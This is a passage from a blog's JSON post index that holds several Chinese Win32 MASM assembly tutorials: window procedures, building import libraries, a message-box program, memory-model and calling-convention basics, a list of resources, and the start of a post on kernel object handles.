找到并填充好消息后 `GetMessage` 才会返回。在这段时间内系统控制权可能会转移给其他的应用程序。这样就构成了Windows 下的多任务结构。如果 `GetMessage` 接收到 `WM_QUIT` 消息后就会返回 `FALSE`，使循环结束并退出应用程序。`TranslateMessage` 函数是一个是实用函数，它从键盘接受原始按键消息，然后解释成 `WM_CHAR`，再把 `WM_CHAR` 放入消息队列，由于经过解释后的消息中含有按键的 ASCII 码，这比原始的扫描码好理解得多。**如果您的应用程序不处理按键消息的话，可以不调用该函数。**`DispatchMessage` 会把消息发送给负责该窗口过程的函数。\n\n```\nmov eax，msg.wParam\nret\nWinMain endp\n```\n\n如果消息循环结束了，退出码存放在 MSG 中的 wParam中，您可以通过把它放到 eax 寄存器中传给 Windows，目前 Windows 没有利用到这个结束码，但我们最好还是遵从 Windows 规范已防意外。\n\n```\nWndProc proc hWnd：HWND， uMsg：UINT， wParam：WPARAM， lParam：LPARAM\n```\n\n是我们的窗口处理函数。您可以随便给该函数命名。其中第一个参数 hWnd 是接收消息的窗口的句柄。uMsg 是接收的消息。注意 uMsg 不是一个 MSG 结构，其实上只是一个 DWORD 类型数。Windows 定义了成百上千个消息，大多数您的应用程序不会处理到。当有该窗口的消息发生时，Windows 会发送一个相关消息给该窗口。其窗口过程处理函数会智能的处理这些消息。wParam 和 lParam 只是附加参数，以方便传递更多的和该消息有关的数据。\n\n```\n.IF uMsg==WM_DESTROY\ninvoke PostQuitMessage，NULL\n.ELSE \ninvoke DefWindowProc，hWnd，uMsg，wParam，lParam\nret\n.ENDIF\nxor eax，eax \nret\nWndProc endp\n```\n\n**上面可以说是关键部分。这也是我们写 Windows 程序时需要改写的主要部分。**此处您的程序检查 Windows 传递过来的消息，如果是我们感兴趣的消息则加以处理，处理完后，在 eax 寄存器中传递 0，否则必须调用 `DefWindowProc`，把该窗口过程接收到的参数传递给缺省的窗口处理函数。所有消息中您**必须处理的是 `WM_DESTROY`**，当您的应用程序结束时 Windows 把这个消息传递进来，当您的应用程序接收到该消息时它已经在屏幕上消失了，这仅是通知您的应用程序窗口已销毁，您必须自己准备返回 Windows 。在此消息中您可以做一些清理工作，但无法阻止退出应用程序。如果您要在窗口销毁前做一些额外工作，可以处理 `WM_CLOSE` 消息。在处理完清理工作后，您必须调用 `PostQuitMessage`，该函数会把 `WM_QUIT` 消息传回您的应用程序，而该消息会使得 GetMessage 返回，并在 eax 寄存器中放入 0，然后会结束消息循环并退回 WINDOWS。您可以在您的程序中调用 `DestroyWindow` 函数，它会发送一个 WM_DESTROY 消息给您自己的应用程序，从而迫使它退出。\n","cover":"","link":"2018/02/06/win32汇编学习-3-：简单的窗口.html","preview":"\u003cp\u003e这次我们将写一个 Windows 程序，它会在桌面显示一个标准的窗口，以此根据代码来学习如何创建一个简单的窗口。\u003c/p\u003e\n","title":"Win32汇编学习(3)：简单的窗口"},{"content":"\n\n\n\nby Iczelion （翻译：花心萝卜yqzq@163.net) 9.5.2000\n\n这篇短文是讲述关于建立MASM导入库（import libraries）技巧，我假设你已经知道什么是导入库。在下面，我将集中讲述建立MASM导入库的方法。\n\n\n\n--------------------------------------\n## MASM导入库的格式：\n--------------------------------------\nMASM和VC++可以使用相同的导入库，MS导入库使用不同于TASM的OMF格式的变更的COFF文件格式，这就是为什么TASM和MASM的导入库不能互用的原因，我将不详细介绍有关MS导入库的格式。可以这样说，每一个MS导入库都包含某个DLL中函数的信息（你将要用这些信息来调用DLL中的函数），这些信息包括函数名和它所有参数的尺寸。如果你用一个文本编辑器打开kernel32.lib，你回发现一些如下格式的信息：  \n\n```\n_ExitProcess@4 \n_CreateProcessA@40\n```\n\n函数名被装饰上了一个“_”，在“@”之后的数字表示了该函数所有参数的尺寸（字节为单位），ExitProcess 函数只有一个DWORD的参数，所以后面的数字是4。 LIB中为什么要包含这些参数尺寸的信息呢？当你用INVOKE调用函数时，这些信息被用来检测传递给函数的参数是否正确。如果你使用“手工”将参数压入堆栈，并通过“CALL”来调用函数的话，MASM将无法检测参数是否正确。这将导致我们几乎没有办法建立一个DLL的导入库，因为DLL并不包含清楚的关于参数尺寸的信息。\n\n-------------------------------------\n## 从DLL建立MASM导入库\n-------------------------------------\n如果你很乐意用“手动”（CALL）的方法去调用函数的话，你可以象下面这样为任何一个DLL建立MASM的导入库：\n使用dumpbin.exe,它可以导出DLL 输出（EXPORT）函数的名字。\n```\nDumpbin /EXPORTS  blah.dll  \u003e  output.txt\n```\n在你获得了函数名列表之后，通过他们建立一个模块定义文件（.DEF）。 举个例子：如果DLL只包含一个函数：GetSomeLine 在一个文本文件中输入如下内容：\n\n```\nLIBRARY blah \nEXPORTS \nGetSomeLine\n```\n\n并将其保存为“blah.def  \n象这样，运行lib.exe，通过模块定义文件建立一个导入库：  \n\n```\nlib /DEF:blah.def\n```\n\n就是它了！你将获得blah.lib,只要你不使用INVOKE调用函数的话，你就可以在MASM中使用它。\n\n-----------------------------------------------------------------\n## 建立通过INVOKE调用函数的MASM导入库:\n-----------------------------------------------------------------\n我并不反对你使用上面的方法，但INVOKE确实是一个调用函数的好途径。这也是我较TASM更喜欢MASM的原因之一。但就象我早先强调的，我们几乎不可能从一个DLL建立一个能100%工作的MASM导入库。如果你使用INVOKE，你将不能用上面的方法建立一个MASM导入库。举个例子，你可以想象如果你在.DEF文件中修改了函数的“@XX”部分，导入库将仍然正常建立，但请相信我，他不会工作的。 建立一个可以使用INVOKE的导入库的一个简单的方法是使用MASM。如果你写过DLL的代码，你会发现你不仅的到了一个DLL，而且还得到了一个导入库，没错，它就是我们要得！ 我们的策略是： \n\n1. 获得函数名和所有参数的尺寸\n2. 建立一个包含正确个数和尺寸的DLL源代码 \n3. 建立一个描述ASM源代码中相应函数的模块定义文件（.DEF） \n4. 将源代码按DLL汇编 \n\n你将获得一个功能完全的MASM导入库，上面的步骤应做更多的说明 \n\n---------------------------------------------\n## 获得函数名和所有参数尺寸\n---------------------------------------------\n这是我们处理过程中最困难的部分了。如果你仅仅只有DLL，你将经历无意义的冒险。下面是我所能想出的方法，不过没有一个能100%工作。  \n\n使用交互式反编译工具（Interactive Disassembler (IDA)）反编译DLL，通过这个奇妙的工具，你可以获得函数参数的大概尺寸，但这些信息是不完全的，IDA是一个功能强大的工具，不过有时必须靠我们自己判断什么是什么。你将不得不仔细分析反编译后的结果。  \n\n观察堆栈指针在调用函数之前和之后的值。方法如下：  \n\n1. 通过GetProcAddress获得函数的地址。\n2. 调用想要测试的每一个函数，但请注意，调用这些函数时，不要给他们传递任何的参数。调用前请注意ESP的值。\n3. 当函数返回后，比较调用函数前、后ESP的值。基本原理是：stdcall参数调用协定规定，函数自己负责恢复堆栈，现在知道为什么我们要不传递任何参数了吧，我们没传递参数，而函数却自作聪明“恢复”了ESP指针，所以ESP的变化值就是我们要得参数尺寸了。\n\n不过，上面的方法并不是万无一失的，下面的这些情况将会导致失败：\n\n- 如果DLL中的函数使用了不同于stdcall的别的参数传递协定。\n- 如果函数在恢复堆栈时失败，我们将无法得到ESP的正确值。\n- 如果这个函数的作用是去做一些危险的事情，比如硬盘格式化，那我们即使得到了ESP，恐怕代价大了点\n\n研究现有的使用DLL的程序，你可以通过调试/反编译这些程序去获得函数参数的个数和尺寸。不论如何，只要有函数在DLL中，而又没有任何程序调用过它，你可以用上面的两个方法。 \n\n---------------------------------\n## 建立我们自己的DLL\n---------------------------------\n在你获得了函数的名字和参数尺寸后，你可以建立一个DLL框架并在框架中添加和其他DLL、文件中的相同名称的函数。举个例子，如果DLL只含有一个函数：GetSomeLine.它有16BYTES的参数。在ASM文件中，你可以这样写： \n\n```\n.386 \n.model flat,stdcall \n.code \nGetSomeLine proc param1:DWORD, param2:DWORD, param3:DWORD, param4:DWORD \nGetSomeline endp \nend\n```\n\n你可能要问，“这是什么？”。一个没有处理部分的程序？请记住：一个导入库并没有记录一个函数是如何实现的，它只是记录函数名和参数尺寸而已，它的任务就是提供函数的名称和尺寸。所以我们不需要添加函数的处理部分。当我们建立DLL时，MASM会帮我们完成它的导入库的建立。 MASM在建立导入库时并不关心每个具体参数的尺寸，它总是象下面这样： \n　\n```\n.386 \n.model flat,stdcall \n.code \nGetSomeLine proc param1:BYTE, param2:BYTE, param3:BYTE, param4:BYTE \nGetSomeline endp \nend\n```\n然后MASM将在导入库中建立_GetSomeLine@16(它会把每一个参数看作DWORD)，而并不管它的参数是4个BYTE还是DWORD或是其他什么\n\n----------------------------------------------------\n## 建立匹配的模块定义文件（.DEF）\n----------------------------------------------------\n这是一个简单的工作，你需要这个文件来指导MASM去建立正确的DLL和与之匹配的导入库。一个模块定义文件模板如下： \n\n```\nLIBRARY  \u003cThe name of the DLL\u003e \nEXPORTS \n\u003cThe names of the functions\u003e\n```\n\n你仅仅需要填入DLL的名字，然后在EXPORTS下添入函数的名字。每个函数名一行。保存文件，你将获得一个模块定义文件。 \n\n-----------------------------\n## 汇编DLL源代码\n-----------------------------\n最后一步也是最简单的一步，仅仅需要ML.EXE和LINK.EXE\n```\nml /c /coff /Cp blah.asm \nlink /DLL /NOENTRY /def:blah.def /subsystem:windows blah.obj\n```\n好了，查看一下你的项目目录，你会发现你想要的导入库和DLL。\n\n**转自[http://blog.csdn.net/taowen2002/article/details/15837](http://blog.csdn.net/taowen2002/article/details/15837)**\n","cover":"","link":"2018/02/06/怎样建立你自己的masm导入库.html","preview":"\u003cp\u003eby Iczelion （翻译：花心萝卜yqzq@163.net) 9.5.2000\u003c/p\u003e\n\n\u003cp\u003e这篇短文是讲述关于建立MASM导入库（import libraries）技巧，我假设你已经知道什么是导入库。在下面，我将集中讲述建立MASM导入库的方法。\u003c/p\u003e\n","title":"怎样建立你自己的MASM导入库"},{"content":"\n\n\n\n这一次，我们将用汇编语言写一个 Windows 程序，程序运行时将弹出一个消息框并显示\"你好，我的第一个Win32汇编程序\"。\n\n\n\n## 理论知识\n\nWindows 为编写应用程序提供了大量的资源。其中最重要的是Windows API (Application Programming Interface)。 Windows API是一大组功能强大的函数，它们本身驻扎在 Windows 中供人们随时调用。这些函数的大部分被包含在几个动态链接库(DLL)中，譬如：kernel32.dll、 user32.dll 和 gdi32.dll。 Kernel32.dll中的函数主要处理内存管理和进程调度；user32.dll中的函数主要控制用户界面；gdi32.dll中的函数则负责图形方面的操作。除了上面主要的三个动态链接库，您还可以调用包含在其他动态链接库中的函数，当然您必须要有关于这些函数的足够的资料。  \n\n动态链接库，顾名思义，这些 API 的代码本身并不包含在 Windows 可执行文件中，而是当要使用时才被加载。为了让应用程序在运行时能找到这些函数，就必须事先把有关的重定位信息嵌入到应用程序的可执行文件中。这些信息存在于引入库中，由链接器把相关信息从引入库中找出插入到可执行文件中。您必须指定正确的引入库，因为只有正确的引入库才会有正确的重定位信息。  \n\n当应用程序被加载时 Windows 会检查这些信息，这些信息包括动态链接库的名字和其中被调用的函数的名字。若检查到这样的信息，Windows 就会加载相应的动态链接库，并且重定位调用的函数语句的入口地址，以便在调用函数时控制权能转移到函数内部。  \n\n如果从和字符集的相关性来分，API 共有两类：一类是处理 ANSI 字符集的，另一类是处理 UNICODE 字符集的。前一类函数名字的尾部带一个\"A\"字符，处理UNICODE的则带一个\"W\"字符(宽字符)。我们比较熟悉的ANSI字符串是以 0 (NULL) 结尾的一串字符数组，每一个ANSI字符是一个 BYTE 宽。对于欧洲语言体系，ANSI 字符集已足够了，但对于有成千上万个唯一字符的几种象形语言体系来说就只有用 UNICODE 字符集了。每一个 UNICODE 字符占有两个 BYTE 宽，这样一来就可以在一个字符串中使用 65336 个不同字符了。  \n\n这也是为什么引进 UNICODE 的原因。在大多数情况下我们都可以包含一个头文件，在其中定义一个宏，然后在实际调用函数时，函数名后不需要加后缀\"A\"或\"W\"。\n如在头文件中定义函数`foo()`；\n\n```cpp\n#ifdef UNICODE\n#define foo() fooW()\n#else\n#define foo() fooA()\n#endif\n```\n\n## 例子\n\n我先把程序框架放在下面，然后我们再向里面加东西。\n\n```\n.386\n.model flat， stdcall\n.data\n.code\nstart：\nend start\n```\n\n应用程序的执行是从 END 定义的标识符后的第一条语句开始的。在上面的框架程序中就是从 START 开始。程序逐条语句执行一直到遇到 JMP，JNE，JE，RET 等跳转指令。这些跳转指令将把执行权转移到其他语句上，若程序要退出 Windows，则必须调用函数 ExitProcess。\n\n```\nExitProcess proto uExitCode：DWORD\n```\n\n上面一行是函数原型。函数原型会告诉编译器和链接器该函数的属性，这样在编译和链接时，编译器和链接器就会作相关的类型检查。 函数的原型定义如下： \n\n```\nFunctionName PROTO [ParameterName]：DataType，[ParameterName]：DataType，... \n```\n\n简言之，就是在函数名后加伪指令PROTO，再跟一串由逗号相隔的数据类型链表。在前面的 ExitProcess 定义中，该函数有一个 DWORD 类型的参数。当您使用高层调用语句 INVOKE 时，使用函数原型定义特别有用，您可以简单地认为 **INVOKE 是一个有参数类型检查的调用语句**。譬如，假设您这样写：\n\n```\ncall ExitProcess\n```\n\n若您事先没把一个DWORD类型参数压入堆栈，编译器和链接器都不会报错，但毫无疑问，在您的程序运行时将引起崩溃。但是，当您这样写：\n\n```\ninvoke ExitProcess\n```\n\n连接器将报错提醒您忘记压入一个 DWORD 类型参数。所以我**建议您用 INVOKE 指令而不是CALL去调用一个函数**。INVOKE 的语法如下：\n\n```\nINVOKE expression [，arguments]\n```\n\nexpression **既可以是一个函数名也可以是一个函数指针**。参数由逗号隔开。大多数API函数的原型放在头文件中。 如果您用的是 MASM32，这些头文件在文件夹MASM32/include 下， 这些头文件的扩展名为 INC，函数名和 DLL 中的函数名相同，譬如：KERNEL32.LIB 引出的函数 ExitProcess 的函数原形声明于kernel.inc中。您也可以自己声明函数原型。 \n\n好，我们现在回到ExitProcess 函数，参数uExitCode 是您希望当您的应用程序结束时传递 Windows 的。 您可以这样写： \n\n```\ninvoke ExitProcess，0 \n```\n\n把这一行放到`start`标识符下，这个应用程序就会立即退出 Windows，当然毫无疑问个应用程序本身是一个完整的 Windows 程序。\n\n**IDE为Visual MASM，masm32安装在c:\\\\masm32**\n\n```\n386\n.model flat， stdcall\noption casemap：none\n\ninclude c:\\masm32\\include\\windows.inc\ninclude c:\\masm32\\include\\kernel32.inc\nincludelib c:\\masm32\\lib\\kernel32.lib\n\n.data\n.code\nstart:\ninvoke ExitProcess，0\nend start\n```\n\n`option casemap：none` 一句的意思是告诉 MASM 要区分标号的大小写，譬如：start 和 START 是不同的。请注意新的伪指令 include，跟在其后的文件名所指定的文件在编译时将“插”在该处。在我们上面的程序段中，当MASM处理到语句 `include c:\\masm\\include\\windows.inc` 时，它就会打开文件夹c:\\masm32\\include 中的文件windows.inc，这和您把整个文件都粘贴到您的源程序中的效果是一样的。 windows.inc 包含了 WIN32 编程所需要的常量和结构体的定义。 但是它不包含函数原型的定义。  \n\n您的应用程序除了从 windows.inc 中得到相关变量结构体的定义外，还需要从其他的头文件中得到函数原型的声明，这些头文件都放在 c:\\masm32\\include 文件夹中。 在我们上面的例子中调用了 kernel.dll 中的函数，所以需要包含有这个函数原型声明的头文件 kernel.inc。如果用文本编辑器打开该文件您会发现里面全是从 kernel.dll中引出的函数的声明。如果您不包含kernel.inc，您仍然可以调用（call）ExitProcess，但不能够调用（invoke）ExitProcess（这会无法通过编译器和连接器的参数合法性检查）。所以若用 invoke 去调用一个函数，您就必须事先声明包含头文件，您完全可以在调用该函数前在源代码的适当位置进行声名。包含头文件主要是为了节省时间（当然还有正确性）  \n\n接下来我们来看看 `includelib` 伪指令，和 `include` 不同，它仅仅是告诉编译器您的程序引用了哪个库。当编译器处理到该指令时会在生成的目标文件中插入链接命令告诉链接器链入什么库。当然您还可以通过在链接器的命令行指定引入库名称的方法来达到和用includelib指令相同的目的，但考虑到命令行仅能够传递128个字符而且要不厌其烦地在命令行敲字符，所以这种方法是非常不可取的。\n\n### 命令行编译\n好了，现在保存例子，取名为msgbox.asm。把 ml.exe（C:\\masm32\\bin） 的路径放到 PATH 环境变量中，键入下面一行 进行编译：\n\n```\nml /c /coff /Cp msgbox.asm\n```\n\n- `/c` 是告诉MASM只编译不链接。这主要是考虑到在链接前您可能还有其他工作要做。 \n- `/coff` 告诉MASM产生的目标文件用 coff 格式。MASM 的 coff 格式是COFF（Common Object File Format：通用目标文件格式） 格式的一种变体。在 UNIX 下的 COFF 格式又有不同。 \n- `/Cp` 告诉 MASM 不要更改用户定义的标识符的大小写。在.model 指令下加入 \"option casemap：none\" 语句，可达到同样的效果。 \n当您成功的编译了 msgbox.asm 后，编译器会产生 msgbox.obj 目标文件，目标文件和可执行文件只一步之遥，目标文件中包含了以二进制形式存在的指令和数据，比可执行文件相差的只是链接器加入的重定位信息。 \n\n好，我们来链接目标文件：\n\n```\nlink /SUBSYSTEM：WINDOWS /LIBPATH：c：\\masm32\\lib msgbox.obj\n```\n\n- `/SUBSYSTEM：WINDOWS` 告诉链接器可执行文件的运行平台 \n- `/LIBPATH：〈path to import library〉` 告诉链接器引入库的路径。 \n链接器做的工作就是根据引入库往目标文件中加入重定位信息，最后产生可执行文件。 既然得到了可执行文件，我们来运行一下。好，一、二、三，GO！屏幕上什么都没有。哦，对了，我们除了调用了 ExitProcess 函数外，什么都还没做呢！但是别一点成就感都没有哦，因为我们用汇编所写的是一个真正 Windows 程序，不信的话，看看您磁盘上的 msgbox.exe文件。\n\n下面我们来做一点可以看的见摸的着的，我们在程序中加入一个对话框。该函数的原型如下：\n\n```\nMessageBox PROTO hwnd：DWORD， lpText：DWORD， lpCaption：DWORD， uType：DWORD \n```\n\n- `hWnd` 是父窗口的句柄。句柄代表您引用的窗口的一个地址指针。它的值对您编 Windows 程序并不重要（译者注：如果您想成为高手则是必须的），您只要知道它代表一个窗口。当您要对窗口做任何操作时，必须要引用该窗口的指针。 \n- `lpText` 是指向您要显示的文本的指针。指向文本串的指针事实上就是文本串的首地址。 \n- `lpCaption` 是指向您要显示的对话框的标题文本串指针。 \n- `uType` 是显示在对话框窗口上的小图标的类型。\n \n下面是源程序\n\n```asm\n.386 \n.model flat,stdcall \noption casemap:none \ninclude \\masm32\\include\\windows.inc \ninclude \\masm32\\include\\kernel32.inc \nincludelib \\masm32\\lib\\kernel32.lib \ninclude \\masm32\\include\\user32.inc \nincludelib \\masm32\\lib\\user32.lib \n\n.data \nMsgBoxCaption db \"可爱的标题\"，0\nMsgBoxText    db \"你好，我的第一个Win32汇编程序\"，0\n\n.code \nstart: \ninvoke MessageBox, NULL, addr MsgBoxText, addr MsgBoxCaption, MB_OK \ninvoke ExitProcess, NULL \nend start \n```\n\n编译、链接上面的程序段，得到可执行文件。运行，哈哈，窗口上弹出了一个对话框，上面有一行字：“你好，我的第一个Win32汇编程序”。\n\n好，我们回过头来看看上面的源代码。我们在.DATA“分段”定义了两个NULL结尾的字符串。我们用了两个常量：`NULL` 和 `MB_OK`。这些常量在windows.inc 文件中有定义，使用常量使得您的程序有较好的可读性。 `addr` 操作符用来把标号的地址传递给被调用的函数，它只能用在 `invoke` 语句中，譬如您不能用它来把标号的地址赋给寄存器或变量，如果想这样做则要用 `offset` 操作符。在 `offset` 和 `addr` 之间有如下区别：\n\n`addr`不可以处理向前引用，`offset`则能。所谓向前引用是指：标号的定义是在`invoke` 语句之后，譬如在如下的例子：\n\n```\ninvoke MessageBox，NULL， addr MsgBoxText，addr MsgBoxCaption，MB_OK\n\n...... \n\nMsgBoxCaption db \"可爱的标题\"，0\nMsgBoxText db \"你好，我的第一个Win32汇编程序\"，0\n```\n\n如果您是用 `addr` 而不是 `offset` 的话，那 MASM 就会报错。\n \n`addr`可以处理局部变量而 `offset` 则不能。局部变量只是在运行时在堆栈中分配内存空间。而 `offset` 则是在编译时由编译器解释，这显然不能用 `offset` 在运行时来分配内存空间。编译器对 `addr` 的处理是先检查处理的是全局还是局部变量，若是全局变量则把其地址放到目标文件中，这一点和 `offset` 相同，若是局部变量，就在执行 `invoke` 语句前产生如下指令序列： \n\n```asm\nlea eax， LocalVar\npush eax\n```\n\n因为`lea`指令能够在运行时决定标号的有效地址，所以有了上述指令序列，就可以保证 `invoke` 的正确执行了。 \n\n### 更方便的编译选择：Visual MASM\n新建一个asm后缀文件，用Visual MASM打开，把上面的代码复制进去，点击左上角的Run即可，如图所示。\n![](http://ww1.sinaimg.cn/large/c0264382gy1fo72650fqnj20ux0ian06.jpg)\n","cover":"","link":"2018/02/05/win32-汇编学习-2-：消息框.html","preview":"\u003cp\u003e这一次，我们将用汇编语言写一个 Windows 程序，程序运行时将弹出一个消息框并显示\u0026rdquo;你好，我的第一个Win32汇编程序\u0026rdquo;。\u003c/p\u003e\n","title":"win32 汇编学习(2)：消息框"},{"content":"\n\n\n\n## 背景知识\n\nWindows 把每一个 Win32 应用程序放到分开的虚拟地址空间中去运行，也就是说每一个应用程序都拥有其相互独立的 4GB 地址空间，当然这倒不是说它们都拥有 4GB 的物理地址空间，而只是说能够在 4GB 的范围内寻址。操作系统将会在应用程序运行时完成 4GB 的虚拟地址和物理内存地址间的转换。这就要求编写应用程序时必须格守 Windows 的规范，否则极易引起内存的保护模式错误。而过去的 Win16 内存模式下，所有的应用程序都运行于同一个 4GB 地址空间，它们可以彼此\"看\"到别的程序的内容，这极易导致一个应用程序破坏另一个应用程序甚至是操作系统的数据或代码。  \n\n\n\n和 16 位 Windows 下的把代码分成 DATA，CODE 等段的内存模式不同，WIN32 只有一种内存模式，即 FLAT 模式，意思是\"平坦\"的内存模式，再没有 64K 的段大小限制，所有的 WIN32 的应用程序运行在一个连续、平坦、巨大的 4GB 的空间中。这同时也意味着您无须和段寄存器打交道，您可以用任意的段寄存器寻址任意的地址空间，这对于程序员来说是非常方便的，这也使得用32位汇编语言和用C语言一样方便。 在Win32下编程，有许多重要的规则需要遵守。有一条很重要的是：Windows 在内部频繁使用 ESI，EDI，EBP，EBX 寄存器，而且并不去检测这些寄存器的值是否被更改，这样当您要使用这些寄存器时必须先保存它们的值，待用完后再恢复它们，一个最显著的应用例子就是 Windows 的 CallBack 函数中。   \n\n## 内容\n\n一般的Win32汇编都有下面的程序段，这是一个Win32汇编编程的基础框架，若您现在还不知道这些指令的确切意义的话，没关系， 随后我就会给大家详细解释。\n```asm\n.386 \n.MODEL Flat, STDCALL \n.DATA \n    \u003cYour initialized data\u003e \n    ...... \n.DATA? \n   \u003cYour uninitialized data\u003e \n   ...... \n.CONST \n   \u003cYour constants\u003e \n   ...... \n.CODE \n   \u003clabel\u003e \n    \u003cYour code\u003e \n   ..... \n    end \u003clabel\u003e \n```\n这就是一般Win32汇编编程的基础框架，其中各个关键词的解释说明如下：\n\n```\n.386\n```\n\n这是一个汇编语言伪指令，他告诉编译器我们的程序是使用80386指令集编写的。您还可以使用 .486、.586， 但最安全的还是使用.386。对于每一种CPU有两套几乎功能相同伪指令： .386/.386P、 486/.486P、 586/.586P。 带P的指令标明您的程序中可以用特权级指令。特权级指令是保留给操作系统的，如虚拟设备驱动程序。在大多数时间，您的程序都无须运行在RING0层，故用不带后缀P的伪指令已足够了。\n\n```\n.MODEL FLAT，STDCALL \n```\n\n`.MODEL` 是用来指定内存模式的伪指令，在Win32下，只有一种内存模型，那就是FLAT。 `STDCALL` 告诉编译器参数的传递约定。参数的传递约定是指参数传达时的顺序(从左到右或从右到左)和由谁恢复堆栈指针(调用者或被调用者)。在Win16下有两种约定：`C` 和 `PASCAL`。C 约定规定参数传递顺序是从右到左，即最右边的参数最先压栈，由调用者恢复堆栈指针。\n\n例如：为调用函数 `foo ( int first_param， int second_param， int third_param )`； 按C约定的汇编代码应该是这样的：\n\n```\npush [third_param]\npush [second_param]\npush [first_param]\ncall foo\nadd esp， 3 * 4 ;调用者自己恢复堆栈指针\n```\n\n`PASCAL`约定和`C`约定正好相反，它规定参数是从左向右传递，由被调用者恢复堆栈。Win16采用了`PASCAL`约定， 因为`PASCAL`约定产生的代码量要小。当不知道参数的个数时，`C`约定特别有用。如在函数`wsprintf ()` 中， `wsprintf`预先并不知道要传递几个参数，所以它不知道如何恢复堆栈。`STDCALL`是`C`约定和`PASCAL`约定的混合体，它规定参数的传递是从右到左，恢复堆栈的工作交由被调用者。Win32只用`STDCALL`约定，但除了一个特例，即：`wsprintf`。\n\n```\n.DATA \n.DATA? \n.CONST \n.CODE\n```\n\n上面的四个伪指令是\"分段\"(SECTION)伪指令。我们上面刚讲过Win32下没有\"段\"(SEGMENT)的概念，但是您可以把您的程序分成不同的\"分段\"， 一个\"分段\"的开始即是上一个\"分段\"的结束。WIN32中只有两种性质的\"分段\"：`DATA`和`CODE`。\n\n其中DATA\"分段\"又分为三种：\n- `.DATA` 其中包括已初始化的数据。\n- `.DATA?` 其中包括未初始化的数据。比如有时您仅想预先分配一些内存但并不想指定初始值。使用未初始化的数据的优点是它不占据可执行文件的大小，如：若您要在 `.DATA?` 段中分配10,000字节的空间，您的可执行文件的大小无须增加10,000字节，而仅仅是要告诉编译器在装载可执行文件时分配所需字节。\n- `.CONST` 其中包括常量定义。这些常量在程序运行过程中是不能更改的。 应用程序并不需要以上所有的三个\"分段\"， 可以根据需要进行定义。 \n- `.CODE` 这是代码\"分段\"。 \n\u003e 实际上，分段并不是象在 Dos 下一样，为不同的段分别指出不同的段寄存器，因为 Windows 下只有一个 4GB 的段，Windows 程序中的分段表现在当程序装载时，赋予不同的分段不同的属性，比如说当你的程序加载时，对于 Ring3 程序来说，.code 段是不可写的，而 .data 段是可写的，如果你尝试象在 Dos 下一样写自己的代码部分，你会得到一个蓝屏错误\n\n```\n\u003clabel\u003e \nend \u003clabel\u003e \n```\n\n是用来唯一标识您的代码范围的标签， 两个标签必须相同，应用程序的所有可执行代码必须在两个标签之间。\n","cover":"","link":"2018/02/05/win32汇编学习-1-：基本概念.html","preview":"\u003ch2\u003e背景知识\u003c/h2\u003e\n\n\u003cp\u003eWindows 把每一个 Win32 应用程序放到分开的虚拟地址空间中去运行，也就是说每一个应用程序都拥有其相互独立的 4GB 地址空间，当然这倒不是说它们都拥有 4GB 的物理地址空间，而只是说能够在 4GB 的范围内寻址。操作系统将会在应用程序运行时完成 4GB 的虚拟地址和物理内存地址间的转换。这就要求编写应用程序时必须格守 Windows 的规范，否则极易引起内存的保护模式错误。而过去的 Win16 内存模式下，所有的应用程序都运行于同一个 4GB 地址空间，它们可以彼此\u0026rdquo;看\u0026rdquo;到别的程序的内容，这极易导致一个应用程序破坏另一个应用程序甚至是操作系统的数据或代码。\u003c/p\u003e\n","title":"Win32汇编学习(1)：基本概念"},{"content":"\n\n\n\n一些win32汇编下学习资源与工具收集\n\n\n\n## 网站\n- [AoGo汇编小站(MASMPlus作者)](http://www.aogosoft.com/)\n- [Win32Asm教程在线版](http://icodeguru.com/Embedded/winasm/index.html)\n- [Win32Asm教程博客园文件备份版](https://files.cnblogs.com/files/Akkuman/winasm.chm.7z)\n![](http://ww1.sinaimg.cn/large/c0264382gy1fo72731wbtj20kp0h247i.jpg)\n\n- [Masm32补充教程系列](https://files.cnblogs.com/files/Akkuman/Masm32%E8%A1%A5%E5%85%85%E6%95%99%E7%A8%8B%E7%B3%BB%E5%88%97.chm.7z)\n![](http://ww1.sinaimg.cn/large/c0264382gy1fo727e56z1j20hs0dcq67.jpg)\n\n- [Win32 ASM Tutorial Resource Kit](https://files.cnblogs.com/files/Akkuman/Win32ASMTRK.chm.7z)：dREAMtHEATER收集的WIN32ASM教程，内容很全，包括32位汇编的基础知识，Iczelion的经典教程中英文版，罗云彬的32位汇编教程，还有PE格式和VxD的一些内容。\n![](http://ww1.sinaimg.cn/large/c0264382gy1fo727jul82j20ln0ettaz.jpg)\n\n\n\n\n## IDE\n- [MASMPlus](http://www.aogosoft.com/masmplus/)\n- [Visual MASM(推荐)](http://www.visualmasm.com/)\n- [RadASM2_fork](https://github.com/mrfearless/RadASM2)\n- [RadAsm 3.x支持中文注释](https://bbs.pediy.com/thread-210513.htm)\n- [SASM](https://dman95.github.io/SASM/english.html)\n- [Easy Code](http://easycode.cat/English/)\n","cover":"","link":"2018/02/04/win32汇编-asm-学习资源.html","preview":"\u003cp\u003e一些win32汇编下学习资源与工具收集\u003c/p\u003e\n","title":"win32汇编(ASM)学习资源"},{"content":"\n\n\n\n当一个进程被初始化时,系统要为它分配一个句柄表。该句柄表只用于内核对象 ,不用于用户对象或GDI对象。  \n\n![](http://ww1.sinaimg.cn/large/c0264382gy1foaobsqowpj20nz05c0t3.jpg)\n\n\n\n## 创建内核对象\n当进程初次被初始化时，它的句柄表是空的。然后，当进程中的线程调用创建内核对象的函数时，比如CreateFileMapping，内核就为该对象分配一个内存块，并对它初始化。这时，内核对进程的句柄表进行扫描，找出一个空项。由于表 3 - 1中的句柄表是空的，内核便找到索引1位置上的结构并对它进行初始化。该指针成员将被设置为内核对象的数据结构的内存地址，访问屏蔽设置为全部访问权，同时，各个标志也作了设置。  \n\n下面列出了用于创建内核对象的一些函数（不是个完整的列表）：\n\n```cpp\nHANDLE CreateThread(\n    PSECURITY_ATTRIBUTE psa,\n    DWORD dwStackSize,\n    LPTHREAD_START_ROUTINE pfnStartAddr,\n    PVOID pvParam,\n    DWORD dwCreationFlags,\n    PDWORD pdwThreadId);\n\nHANDLE CreateFile(\n    PCTSTR pszFileNAme,\n    DWORD dwDesiredAccess,\n    DWORD dwShareMode,\n    PSECURITY_ATTRIBUTES psa,\n    DWORD dwCreationDistribution,\n    DWORD dwFlagsAndAttributes,\n    HANDLE hTemplateFile);\n\nHANDLE CreateFileMapping(\n    HANDLE hFile,\n    PSECURITY_ATTRIBUTES psa,\n    DWORD flPRotect,\n    DWORD dwMaximumSizeHigh,\n    DWORD dwMaximumSizeLow,\n    PCTSTR pszName);\n\nHANDLE CreateSemaphore(\n    PSECURITY_ATTRIBUTES psa,\n    LONG lInitialCount,\n    LONG lMaximumCount,\n    PCTSTR 